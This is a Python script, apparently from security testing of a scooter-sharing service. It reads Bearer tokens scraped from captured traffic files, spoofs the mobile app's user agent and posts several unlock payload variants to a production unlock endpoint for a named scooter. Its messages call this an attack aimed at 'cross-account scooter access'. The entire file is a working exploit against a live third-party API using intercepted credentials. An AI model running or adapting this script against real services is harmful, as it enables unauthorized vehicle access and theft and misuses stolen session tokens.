#!/usr/bin/env python3
"""
SXB306 Scooter Unlock Test
Inspired by the successful test_tuf061_unlock.py
"""

import requests
import json
import time
import re
from datetime import datetime

# API Configuration
BASE_URL = "https://api.knotcity.io"

# SXB306 Scooter Configuration
SXB306_SCOOTER = {
    "serial": "SXB306",
    "lat": 48.8566,  # Paris coordinates
    "lng": 2.3522
}

def extract_latest_token():
    """Extract the latest token from capture files"""
    print("[SEARCH] Extracting latest token...")
    
    # Try LATEST_TOKEN.txt first
    try:
        with open('LATEST_TOKEN.txt', 'r', encoding='utf-8') as f:
            token = f.read().strip()
        if token and token.startswith('Bearer '):
            print(f"[OK] Found token in LATEST_TOKEN.txt: {token[:50]}...")
            return token
    except:
        pass
    
    # Fallback to capture files
    capture_files = [
        'CAPTURED_NEW_ACCOUNT.txt',
        'CAPTURED_WORKING_FINAL.txt', 
        'CAPTURED_API_DECRYPT.txt',
        'CAPTURED_API.txt'
    ]
    
    for filename in capture_files:
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Look for Bearer tokens
            bearer_pattern = r'Bearer eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            tokens = re.findall(bearer_pattern, content)
            
            if tokens:
                token = tokens[-1]  # Get the most recent
                print(f"[OK] Found token in {filename}: {token[:50]}...")
                return token
        except:
            continue
    
    print("[ERROR] No Bearer tokens found")
    return None

def test_sxb306_unlock(token):
    """Attempt to unlock SXB306 using the token"""
    print("=" * 80)
    print("[ATTACK] SXB306 UNLOCK TEST")
    print("=" * 80)
    print(f"[TARGET] Scooter: {SXB306_SCOOTER['serial']}")
    print(f"[LOCATION] Lat: {SXB306_SCOOTER['lat']}, Lng: {SXB306_SCOOTER['lng']}")
    print(f"[TOKEN] {token[:50]}...")
    print("=" * 80)
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "MaynDrive/1.1.34 (Android; Mobile)",
        "Accept": "application/json"
    }
    
    # Test different unlock payloads
    unlock_payloads = [
        {
            "serial_number": SXB306_SCOOTER['serial'],
            "lat": SXB306_SCOOTER['lat'],
            "lng": SXB306_SCOOTER['lng']
        },
        {
            "serial": SXB306_SCOOTER['serial'],
            "latitude": SXB306_SCOOTER['lat'],
            "longitude": SXB306_SCOOTER['lng']
        },
        {
            "vehicle_id": SXB306_SCOOTER['serial'],
            "lat": SXB306_SCOOTER['lat'],
            "lng": SXB306_SCOOTER['lng']
        }
    ]
    
    for i, payload in enumerate(unlock_payloads, 1):
        print(f"\n[TEST {i}] Trying unlock payload:")
        print(f"   {json.dumps(payload, indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"[SUCCESS] SXB306 UNLOCKED with payload {i}!")
                print("[CRITICAL] VULNERABILITY CONFIRMED!")
                return True
            elif response.status_code == 401:
                print(f"[ERROR] Token expired/invalid")
                return False
            elif response.status_code == 403:
                print(f"[ERROR] Permission denied")
                return False
            elif response.status_code == 400:
                print(f"[ERROR] Bad request - checking details...")
                try:
                    error_data = response.json()
                    print(f"   Error: {error_data}")
                except:
                    print(f"   Raw error: {response.text}")
            else:
                print(f"[ERROR] Unexpected response: {response.status_code}")
                
        except Exception as e:
            print(f"[ERROR] Request failed: {e}")
    
    return False

def main():
    print("=" * 80)
    print("[SXB306] SCOOTER UNLOCK TEST")
    print("=" * 80)
    
    # Extract token
    token = extract_latest_token()
    if not token:
        print("[ERROR] No token found. Please capture a fresh token first.")
        return
    
    # Test SXB306 unlock
    success = test_sxb306_unlock(token)
    
    print("\n" + "=" * 80)
    if success:
        print("[RESULT] SXB306 UNLOCK SUCCESSFUL!")
        print("[WARNING] CRITICAL SECURITY VULNERABILITY!")
        print("[CRITICAL] Cross-account scooter access is possible!")
    else:
        print("[RESULT] SXB306 unlock failed")
        print("[OK] Security appears to be working properly")
    print("=" * 80)

if __name__ == "__main__":
    main()
